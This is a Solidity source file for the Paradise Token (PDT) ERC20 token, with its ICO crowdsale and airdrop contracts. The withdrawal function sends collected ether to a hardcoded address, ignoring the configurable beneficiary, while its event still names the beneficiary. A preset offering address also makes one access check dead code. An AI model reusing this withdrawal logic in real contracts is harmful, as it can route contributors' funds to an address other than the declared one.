1 /*************************
2  * 
3  *  `＿　　　　　   (三|  
4  *  |ﾋ_)　／￣￣＼ 　PDT  
5  *  | | ／●) (●)  ＼｜｜  
6  *  |_|(　(_人_)　　)^亅  
7  *  | ヽ＼　￣　＿／ ミﾉ  
8  *  ヽﾉﾉ￣|ﾚ―-ｲ / ﾉ  ／   
9  *  　＼　ヽ＼ |/ イ      
10  * 　／￣二二二二二二＼   
11  * `｜raj｜ Paradise ｜｜  
12  * 　＼＿二二二二二二／   
13  *
14  *************************/
15 
16 pragma solidity ^0.5.0;
17 
18 /**
19  * @title Ownable
20  * @dev The Ownable contract has an owner address, and provides basic authorization control
21  * functions, this simplifies the implementation of "user permissions".
22  */
23 contract Ownable {
24   address public owner;
25 
26   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
27 
28   /**
29    * @dev The Ownable constructor sets the original `owner` of the contract to the sender
30    * account.
31    */
32   constructor() public {
33     owner = msg.sender;
34   }
35 
36   /**
37    * @dev Throws if called by any account other than the owner.
38    */
39   modifier onlyOwner() {
40     require(msg.sender == owner);
41     _;
42   }
43 
44 
45   /**
46    * @dev Allows the current owner to transfer control of the contract to a newOwner.
47    * @param newOwner The address to transfer ownership to.
48    */
49   function transferOwnership(address newOwner) public onlyOwner {
50     require(newOwner != address(0));
51     emit OwnershipTransferred(owner, newOwner);
52     owner = newOwner;
53   }
54 
55 }
56 
57 /**
58  * @title Pausable
59  * @dev Base contract which allows children to implement an emergency stop mechanism.
60  */
61 contract Pausable is Ownable {
62   event Pause();
63   event Unpause();
64 
65   bool public paused = false;
66 
67 
68   /**
69    * @dev Modifier to make a function callable only when the contract is not paused.
70    */
71   modifier whenNotPaused() {
72     require(!paused);
73     _;
74   }
75 
76   /**
77    * @dev Modifier to make a function callable only when the contract is paused.
78    */
79   modifier whenPaused() {
80     require(paused);
81     _;
82   }
83 
84   /**
85    * @dev called by the owner to pause, triggers stopped state
86    */
87   function pause() onlyOwner whenNotPaused public {
88     paused = true;
89     emit Pause();
90   }
91 
92   /**
93    * @dev called by the owner to unpause, returns to normal state
94    */
95   function unpause() onlyOwner whenPaused public {
96     paused = false;
97     emit Unpause();
98   }
99 }
100 
101 /**
102  * @title SafeMath
103  * @dev Math operations with safety checks that throw on error
104  */
105 library SafeMath {
106   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
107     if (a == 0) {
108       return 0;
109     }
110     uint256 c = a * b;
111     assert(c / a == b);
112     return c;
113   }
114 
115   function div(uint256 a, uint256 b) internal pure returns (uint256) {
116     // assert(b > 0); // Solidity automatically throws when dividing by 0
117     uint256 c = a / b;
118     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
119     return c;
120   }
121 
122   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
123     assert(b <= a);
124     return a - b;
125   }
126 
127   function add(uint256 a, uint256 b) internal pure returns (uint256) {
128     uint256 c = a + b;
129     assert(c >= a);
130     return c;
131   }
132 }
133 
134  /**
135  * @title ERC20Basic
136  * @dev see https://github.com/ethereum/EIPs/issues/179
137  */
138 contract ERC20Basic {
139   uint256 public totalSupply;
140   function balanceOf(address who) public view returns (uint256);
141   function transfer(address to, uint256 value) public returns (bool);
142   event Transfer(address indexed from, address indexed to, uint256 value);
143 }
144 
145 /**
146  * @title ERC20 interface
147  * @dev see https://github.com/ethereum/EIPs/issues/20
148  */
149 contract ERC20 is ERC20Basic {
150   function allowance(address owner, address spender) public view returns (uint256);
151   function transferFrom(address from, address to, uint256 value) public returns (bool);
152   function approve(address spender, uint256 value) public returns (bool);
153   event Approval(address indexed owner, address indexed spender, uint256 value);
154 }
155 
156 /**
157  * @title Basic token
158  * @dev Basic version of StandardToken
159  */
160 contract BasicToken is ERC20Basic {
161   using SafeMath for uint256;
162 
163   mapping(address => uint256) balances;
164 
165   /**
166   * @dev transfer token for a specified address
167   * @param _to The address to transfer to.
168   * @param _value The amount to be transferred.
169   */
170   function transfer(address _to, uint256 _value) public returns (bool) {
171     require(_to != address(0));
172     require(_value <= balances[msg.sender]);
173 
174     // SafeMath.sub will throw if there is not enough balance.
175     balances[msg.sender] = balances[msg.sender].sub(_value);
176     balances[_to] = balances[_to].add(_value);
177     emit Transfer(msg.sender, _to, _value);
178     return true;
179   }
180 
181   /**
182   * @dev Gets the balance of the specified address.
183   * @param _owner The address to query the the balance of.
184   * @return An uint256 representing the amount owned by the passed address.
185   */
186   function balanceOf(address _owner) public view returns (uint256 balance) {
187     return balances[_owner];
188   }
189 
190 }
191 
192 /**
193  * @title Standard ERC20 token
194  *
195  * @dev Implementation of the basic standard token.
196  * @dev https://github.com/ethereum/EIPs/issues/20
197  */
198 contract StandardToken is ERC20, BasicToken {
199 
200   mapping (address => mapping (address => uint256)) internal allowed;
201 
202   /**
203    * @dev Transfer tokens from one address to another
204    * @param _from address The address which you want to send tokens from
205    * @param _to address The address which you want to transfer to
206    * @param _value uint256 the amount of tokens to be transferred
207    */
208   function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
209     require(_to != address(0));
210     require(_value <= balances[_from]);
211     require(_value <= allowed[_from][msg.sender]);
212 
213     balances[_from] = balances[_from].sub(_value);
214     balances[_to] = balances[_to].add(_value);
215     allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
216     emit Transfer(_from, _to, _value);
217     return true;
218   }
219 
220   /**
221    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
222    *
223    * Beware that changing an allowance with this method brings the risk that someone may use both the old
224    * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
225    * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
226    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
227    * @param _spender The address which will spend the funds.
228    * @param _value The amount of tokens to be spent.
229    */
230   function approve(address _spender, uint256 _value) public returns (bool) {
231     allowed[msg.sender][_spender] = _value;
232     emit Approval(msg.sender, _spender, _value);
233     return true;
234   }
235 
236   /**
237    * @dev Function to check the amount of tokens that an owner allowed to a spender.
238    * @param _owner address The address which owns the funds.
239    * @param _spender address The address which will spend the funds.
240    * @return A uint256 specifying the amount of tokens still available for the spender.
241    */
242   function allowance(address _owner, address _spender) public view returns (uint256) {
243     return allowed[_owner][_spender];
244   }
245 
246   /**
247    * @dev Increase the amount of tokens that an owner allowed to a spender.
248    *
249    * approve should be called when allowed[_spender] == 0. To increment
250    * allowed value is better to use this function to avoid 2 calls (and wait until
251    * the first transaction is mined)
252    * @param _spender The address which will spend the funds.
253    * @param _addedValue The amount of tokens to increase the allowance by.
254    */
255   function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
256     allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
257     emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
258     return true;
259   }
260 
261   /**
262    * @dev Decrease the amount of tokens that an owner allowed to a spender.
263    *
264    * approve should be called when allowed[_spender] == 0. To decrement
265    * allowed value is better to use this function to avoid 2 calls (and wait until
266    * the first transaction is mined)
267    * @param _spender The address which will spend the funds.
268    * @param _subtractedValue The amount of tokens to decrease the allowance by.
269    */
270   function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
271     uint oldValue = allowed[msg.sender][_spender];
272     if (_subtractedValue > oldValue) {
273       allowed[msg.sender][_spender] = 0;
274     } else {
275       allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
276     }
277     emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
278     return true;
279   }
280 
281 }
282 
283 
284 /*
285  * ParadiseToken is a standard ERC20 token with some additional functionalities:
286  * - Transfers are only enabled after contract owner enables it (After StartTime)
287  * - Contract sets 70% of the total supply as allowance for ICO contract
288  */
289     
290 contract ParadiseToken is StandardToken, Ownable {
291     
292     // Constants
293     string public constant symbol = "PDT";
294     string public constant name = "Paradise Token";
295     uint8 public constant decimals = 18;
296     uint256 public constant InitialSupplyCup = 300000000 * (10 ** uint256(decimals)); // 300 mil tokens minted
297     uint256 public constant TokenAllowance = 210000000 * (10 ** uint256(decimals));   // 210 mil tokens public allowed 
298     uint256 public constant AdminAllowance = InitialSupplyCup - TokenAllowance;       // 90 mil tokens admin allowed 
299     
300     // Properties
301     address public adminAddr;            // the number of tokens available for the administrator
302     address public tokenAllowanceAddr = 0x9A4518ad59ac1D0Fc9A77d9083f233cD0b8d77Fa; // the number of tokens available for crowdsales
303     bool public transferEnabled = false;  // indicates if transferring tokens is enabled or not
304     
305     
306     modifier onlyWhenTransferAllowed() {
307         require(transferEnabled || msg.sender == adminAddr || msg.sender == tokenAllowanceAddr);
308         _;
309     }
310 
311     /**
312      * Check if token offering address is set or not
313      */
314     modifier onlyTokenOfferingAddrNotSet() {
315         require(tokenAllowanceAddr == address(0x0));
316         _;
317     }
318 
319     /**
320      * Check if address is a valid destination to transfer tokens to
321      * - must not be zero address
322      * - must not be the token address
323      * - must not be the owner's address
324      * - must not be the admin's address
325      * - must not be the token offering contract address
326      */
327     modifier validDestination(address to) {
328         require(to != address(0x0));
329         require(to != address(this));
330         require(to != owner);
331         require(to != address(adminAddr));
332         require(to != address(tokenAllowanceAddr));
333         _;
334     }
335     
336     /**
337      * Token contract constructor
338      *
339      * @param admin Address of admin account
340      */
341     constructor(address admin) public {
342         totalSupply = InitialSupplyCup;
343         
344         // Mint tokens
345         balances[msg.sender] = totalSupply;
346         emit Transfer(address(0x0), msg.sender, totalSupply);
347 
348         // Approve allowance for admin account
349         adminAddr = admin;
350         approve(adminAddr, AdminAllowance);
351     }
352 
353     /**
354      * Set token offering to approve allowance for offering contract to distribute tokens
355      *
356      * Note that if _amountForSale is 0, then it is assumed that the full
357      * remaining crowdsale supply is made available to the crowdsale.
358      * 
359      * @param offeringAddr Address of token offerng contract
360      * @param amountForSale Amount of tokens for sale, set 0 to max out
361      */
362     function setTokenOffering(address offeringAddr, uint256 amountForSale) external onlyOwner {
363         require(!transferEnabled);
364 
365         uint256 amount = (amountForSale == 0) ? TokenAllowance : amountForSale;
366         require(amount <= TokenAllowance);
367 
368         approve(offeringAddr, amount);
369         tokenAllowanceAddr = offeringAddr;
370         
371     }
372     
373     /**
374      * Enable transfers
375      */
376     function enableTransfer() external onlyOwner {
377         transferEnabled = true;
378 
379         // End the offering
380         approve(tokenAllowanceAddr, 0);
381     }
382 
383     /**
384      * Transfer from sender to another account
385      *
386      * @param to Destination address
387      * @param value Amount of PDTtokens to send
388      */
389     function transfer(address to, uint256 value) public onlyWhenTransferAllowed validDestination(to) returns (bool) {
390         return super.transfer(to, value);
391     }
392     
393     /**
394      * Transfer from `from` account to `to` account using allowance in `from` account to the sender
395      *
396      * @param from Origin address
397      * @param to Destination address
398      * @param value Amount of PDTtokens to send
399      */
400     function transferFrom(address from, address to, uint256 value) public onlyWhenTransferAllowed validDestination(to) returns (bool) {
401         return super.transferFrom(from, to, value);
402     }
403     
404 }
405 
406 /**
407  * The ParadiseToken token (PDT) has a fixed supply and restricts the ability
408  * to transfer tokens until the owner has called the enableTransfer()
409  * function.
410  *
411  * The owner can associate the token with a token sale contract. In that
412  * case, the token balance is moved to the token sale contract, which
413  * in turn can transfer its tokens to contributors to the sale.
414  */
415 
416 contract ParadiseTokenSale is Pausable {
417 
418     using SafeMath for uint256;
419 
420     // The beneficiary is the future recipient of the funds
421     address public beneficiary = 0x1Bb7390407F7987BD160993dE44d6f2737945436;
422 
423     // The crowdsale has a funding goal, cap, deadline, and minimum contribution
424     uint public fundingGoal = 22700 ether;  // Base on 75$ per ether
425     uint public fundingCap = 53400 ether;   // Base on 75$ per ether
426     uint public minContribution = 10**17;   // 0.1 Ether
427     bool public fundingGoalReached = false;
428     bool public fundingCapReached = false;
429     bool public saleClosed = false;
430 
431     // Time period of sale (UNIX timestamps)
432     uint public startTime = 1547031675; // Wednesday, 09-Jan-19 @ 11:01:15 am (UTC)
433     uint public endTime = 1552129275;  //  Saturday, 09-Mar-19 @ 11:01:15 am (UTC)
434    
435     // Keeps track of the amount of wei raised
436     uint public amountRaised;
437     // amount that has been refunded so far
438     uint public refundAmount;
439 
440     // The ratio of PDT to Ether
441     uint public rate;
442     uint public constant LOW_RANGE_RATE = 10000;    // 0% bonus
443     uint public constant HIGH_RANGE_RATE = 14000;   // 40% bonus for 1 week
444     
445     // The token being sold
446     ParadiseToken public tokenReward;
447 
448     // A map that tracks the amount of wei contributed by address
449     mapping(address => uint256) public balanceOf;
450     
451     // Events
452     event GoalReached(address _beneficiary, uint _amountRaised);
453     event CapReached(address _beneficiary, uint _amountRaised);
454     event FundTransfer(address _backer, uint _amount, bool _isContribution);
455 
456     // Modifiers
457     modifier beforeDeadline()   { require (currentTime() < endTime); _; }
458     modifier afterDeadline()    { require (currentTime() >= endTime); _; }
459     modifier afterStartTime()    { require (currentTime() >= startTime); _; }
460 
461     modifier saleNotClosed()    { require (!saleClosed); _; }
462 
463     
464     /**
465      * Constructor for a crowdsale of ParadiseToken tokens.
466      *
467      * @param ifSuccessfulSendTo            the beneficiary of the fund
468      * @param fundingGoalInEthers           the minimum goal to be reached
469      * @param fundingCapInEthers            the cap (maximum) size of the fund
470      * @param minimumContributionInWei      minimum contribution (in wei)
471      * @param start                         the start time (UNIX timestamp)
472      * @param durationInMinutes             the duration of the crowdsale in minutes
473      * @param ratePDTToEther                the conversion rate from PDT to Ether
474      * @param addressOfTokenUsedAsReward    address of the token being sold
475      */
476     constructor(
477         address ifSuccessfulSendTo,
478         uint fundingGoalInEthers,
479         uint fundingCapInEthers,
480         uint minimumContributionInWei,
481         uint start,
482         uint durationInMinutes,
483         uint ratePDTToEther,
484         address addressOfTokenUsedAsReward
485     ) public {
486         require(ifSuccessfulSendTo != address(0) && ifSuccessfulSendTo != address(this));
487         require(addressOfTokenUsedAsReward != address(0) && addressOfTokenUsedAsReward != address(this));
488         require(fundingGoalInEthers <= fundingCapInEthers);
489         require(durationInMinutes > 0);
490         beneficiary = ifSuccessfulSendTo;
491         fundingGoal = fundingGoalInEthers * 1 ether;
492         fundingCap = fundingCapInEthers * 1 ether;
493         minContribution = minimumContributionInWei;
494         startTime = start;
495         endTime = start + durationInMinutes * 1 minutes; 
496         setRate(ratePDTToEther);
497         tokenReward = ParadiseToken(addressOfTokenUsedAsReward);
498     }
499 
500     /**
501      * This function is called whenever Ether is sent to the
502      * smart contract. It can only be executed when the crowdsale is
503      * not paused, not closed, and before the deadline has been reached.
504      *
505      * This function will update state variables for whether or not the
506      * funding goal or cap have been reached. It also ensures that the
507      * tokens are transferred to the sender, and that the correct
508      * number of tokens are sent according to the current rate.
509      */
510     function () payable external {
511         buy();
512     }
513 
514     function buy ()
515         payable public
516         whenNotPaused
517         beforeDeadline
518         afterStartTime
519         saleNotClosed
520     {
521         require(msg.value >= minContribution);
522         uint amount = msg.value;
523         
524         // Compute the number of tokens to be rewarded to the sender
525         // Note: it's important for this calculation that both wei
526         // and PDT have the same number of decimal places (18)
527         uint numTokens = amount.mul(rate);
528         
529         // Transfer the tokens from the crowdsale supply to the sender
530         if (tokenReward.transferFrom(tokenReward.owner(), msg.sender, numTokens)) {
531     
532         // update the total amount raised
533         amountRaised = amountRaised.add(amount);
534      
535         // update the sender's balance of wei contributed
536         balanceOf[msg.sender] = balanceOf[msg.sender].add(amount);
537 
538         emit FundTransfer(msg.sender, amount, true);
539         // Check if the funding goal or cap have been reached
540         checkFundingGoal();
541         checkFundingCap();
542         }
543         else {
544             revert();
545         }
546     }
547     
548     /**
549      * The owner can update the rate (PDT to ETH).
550      *
551      * @param _rate  the new rate for converting PDT to ETH
552      */
553     function setRate(uint _rate) public onlyOwner {
554         require(_rate >= LOW_RANGE_RATE && _rate <= HIGH_RANGE_RATE);
555         rate = _rate;
556     }
557     
558      /**
559      * The owner can terminate the crowdsale at any time.
560      */
561     function terminate() external onlyOwner {
562         saleClosed = true;
563     }
564     
565      /**
566      *
567      * The owner can allocate the specified amount of tokens from the
568      * crowdsale allowance to the recipient (to).
569      *
570      * NOTE: be extremely careful to get the amounts correct, which
571      * are in units of wei and PDT. Every digit counts.
572      *
573      * @param to            the recipient of the tokens
574      * @param amountWei     the amount contributed in wei
575      * @param amountPDT the amount of tokens transferred in PDT
576      */
577      
578      
579      function ownerAllocateTokens(address to, uint amountWei, uint amountPDT) public
580             onlyOwner 
581     {
582         //don't allocate tokens for the admin
583         //require(tokenReward.adminAddr() != to);
584         
585         if (!tokenReward.transferFrom(tokenReward.owner(), to, amountPDT)) {
586             revert();
587         }
588         amountRaised = amountRaised.add(amountWei);
589         balanceOf[to] = balanceOf[to].add(amountWei);
590         emit FundTransfer(to, amountWei, true);
591         checkFundingGoal();
592         checkFundingCap();
593     }
594 
595     /**
596      * The owner can call this function to withdraw the funds that
597      * have been sent to this contract. The funds will be sent to
598      * the beneficiary specified when the crowdsale was created.
599      */
600     function ownerSafeWithdrawal() external onlyOwner  {
601         uint balanceToSend = address(this).balance;
602         address(0x1Bb7390407F7987BD160993dE44d6f2737945436).transfer(balanceToSend);
603         emit FundTransfer(beneficiary, balanceToSend, false);
604     }
605     
606    /**
607      * Checks if the funding goal has been reached. If it has, then
608      * the GoalReached event is triggered.
609      */
610     function checkFundingGoal() internal {
611         if (!fundingGoalReached) {
612             if (amountRaised >= fundingGoal) {
613                 fundingGoalReached = true;
614                 emit GoalReached(beneficiary, amountRaised);
615             }
616         }
617     }
618 
619     /**
620      * Checks if the funding cap has been reached. If it has, then
621      * the CapReached event is triggered.
622      */
623    function checkFundingCap() internal {
624         if (!fundingCapReached) {
625             if (amountRaised >= fundingCap) {
626                 fundingCapReached = true;
627                 saleClosed = true;
628                 emit CapReached(beneficiary, amountRaised);
629             }
630         }
631     }
632 
633     /**
634      * Returns the current time.
635      * Useful to abstract calls to "now" for tests.
636     */
637     function currentTime() view public returns (uint _currentTime) {
638         return now;
639     }
640 }
641 
642 interface IERC20 {
643   function balanceOf(address _owner) external view returns (uint256);
644   function allowance(address _owner, address _spender) external view returns (uint256);
645   function transfer(address _to, uint256 _value) external returns (bool);
646   function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
647   function approve(address _spender, uint256 _value) external returns (bool);
648   event Transfer(address indexed from, address indexed to, uint256 value);
649   event Approval(address indexed owner, address indexed spender, uint256 value);
650 }
651 
652 /**
653  * @title ParadiseToken initial distribution
654  * @dev Distribute airdrop tokens
655  */
656  
657 contract PDTDistribution is Ownable {
658   
659   function drop(IERC20 token, address[] memory recipients, uint256[] memory values) public onlyOwner {
660     for (uint256 i = 0; i < recipients.length; i++) {
661       token.transfer(recipients[i], values[i]);
662     }
663   }
664 }
665 
666 /*
667  *（｀・P・）（｀・P・´）（・P・´）
668  *     Created by Paradise
669  *（´・P・）（´・P・｀）（・P・｀）
670  */